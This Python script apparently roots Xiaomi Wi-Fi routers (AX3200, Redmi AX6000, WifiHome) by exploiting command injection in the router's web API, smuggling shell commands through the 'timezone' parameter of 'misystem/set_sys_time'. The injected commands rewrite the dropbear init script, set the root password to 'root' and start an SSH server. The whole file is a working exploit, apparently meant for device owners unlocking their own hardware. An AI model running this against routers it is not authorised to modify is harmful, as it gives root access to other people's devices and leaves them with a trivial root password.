#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import types
import platform
import ctypes
import binascii
import re
import requests
import urllib

sys.path.append(os.path.dirname(os.path.abspath(__file__)))
from gateway import *

# Devices:
# RB01    FW any        AX3200
# RB06    FW any        Redmi AX6000
# RB08    FW any        WifiHome


gw = Gateway(timeout = 4, detect_ssh = False)
if gw.status < 1:
  die("Xiaomi Mi Wi-Fi device not found (IP: {})".format(gw.ip_addr))

print("device_name =", gw.device_name)
print("rom_version = {} {}".format(gw.rom_version, gw.rom_channel))
print("mac address = {}".format(gw.mac_address))

dn = gw.device_name
gw.ssh_port = 22
ret = gw.detect_ssh(verbose = 1, interactive = True)
if ret > 0:
  die(0, "SSH server already installed and running")

stok = gw.web_login()

def exec_cmd(cmd = {}, api = 'misystem/set_sys_time'):
  params = cmd
  if isinstance(cmd, str):
    params = { 'timezone': " ' ; " + cmd + " ; " }
  res = requests.get(gw.apiurl + api, params = params)
  return res.text

res = exec_cmd(api = 'xqnetwork/get_netmode')
if '"code":0' not in res:
  die('Extension "/api/xqnetwork/get_netmode" not working!')
if '"netmode":4,' not in res:
  die('It is necessary to reorganize the device into "whc_cap" mode!')

#res = exec_cmd('logger hello_world_3335556_')
res = exec_cmd("sed -i 's/`nvram get ssh_en`/1/g' /etc/init.d/dropbear")
if '"code":0' not in res:
  die('Exploit not working!!!')
res = exec_cmd("sed -i 's/release/XXXXXX/g' /etc/init.d/dropbear")
res = exec_cmd("(echo root; sleep 1; echo root) | passwd root")
res = exec_cmd("/etc/init.d/dropbear enable")
print('Run SSH server on port 22 ...')
res = exec_cmd("/etc/init.d/dropbear restart")
res = exec_cmd("logger -t XMiR ___completed___")

time.sleep(0.5)
gw.use_ssh = True
gw.passw = 'root'
gw.ping(contimeout = 10)   # RSA host key generate slowly!

print("")
print('#### SSH and Telnet services are activated! ####')

